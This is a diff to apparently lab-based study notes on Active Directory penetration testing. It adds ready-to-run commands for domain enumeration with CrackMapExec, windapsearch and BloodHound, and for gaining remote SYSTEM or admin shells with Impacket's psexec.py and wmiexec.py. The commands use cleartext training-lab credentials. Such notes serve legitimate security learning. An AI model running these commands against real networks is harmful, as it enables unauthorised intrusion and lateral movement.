@@ -322,14 +322,15 @@ Action              : Deny
 
 ```
 
-## PowerShell Constrained Language Mode
+### PowerShell Constrained Language Mode
 - PowerShell Constrained Language Mode locks down many of the features needed to use PowerShell effectively, such as blocking COM objects, only allowing approved .NET types, XAML-based workflows, PowerShell classes, and more. 
 - We can quickly enumerate whether we are in Full Language Mode or Constrained Language Mode.
+- [wadcoms project](https://wadcoms.github.io/)
 
 ```powershell
 PS C:\user> $ExecutionContext.SessionState.LanguageMode
 ```
-## LAPS
+### LAPS
 - The Microsoft Local Administrator Password Solution (LAPS) is used to randomize and rotate local administrator passwords on Windows hosts and prevent lateral movement. 
 - We can enumerate what domain users can read the LAPS password set for machines with LAPS installed and what machines do not have LAPS installed.
 
@@ -339,4 +340,61 @@ Find-LAPSDelegatedGroups
 Find-AdmPwdExtendedRights
 Get-LAPSComputers
 
+```
+
+
+## Credentialed Enumeration - from Linux
+- We are interested in information about domain user and computer attributes, group membership, Group Policy Objects, permissions, ACLs, trusts, and more. 
+- we will have to have acquired a user's cleartext password, NTLM password hash, or SYSTEM access on a domain-joined host.
+### CrackMapExec / Netexec 
+
+```shell
+# Domain User Enumeration
+sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
+
+# Domain Group Enumeration
+sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
+
+# Logged On Users
+sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
+
+# Spider_plus
+sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
+```
+
+
+### Impacket Toolkit
+
+#### Psexec.py
+- The tool creates a remote service by uploading a randomly-named executable to the ADMIN$ share on the target host. 
+- It then registers the service via RPC and the Windows Service Control Manager. Once established, communication happens over a named pipe, providing an interactive remote shell as SYSTEM on the victim host.
+
+```
+psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125  
+```
+#### wmiexec.py
+- it runs as the local admin user we connected 
+- each command issued will execute a new cmd.exe from WMI and execute your command. 
+```
+wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5  
+```
+
+### Windapsearch
+
+```shell
+# Domain Admins
+python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
+
+# Privileged Users
+python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
+```
+
+### Bloodhound.py
+
+```
+sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all
+ls
+sudo neo4j start 
+zip -r ilfreight_bh.zip *.json
+## upload zip file in neo4j
 ```
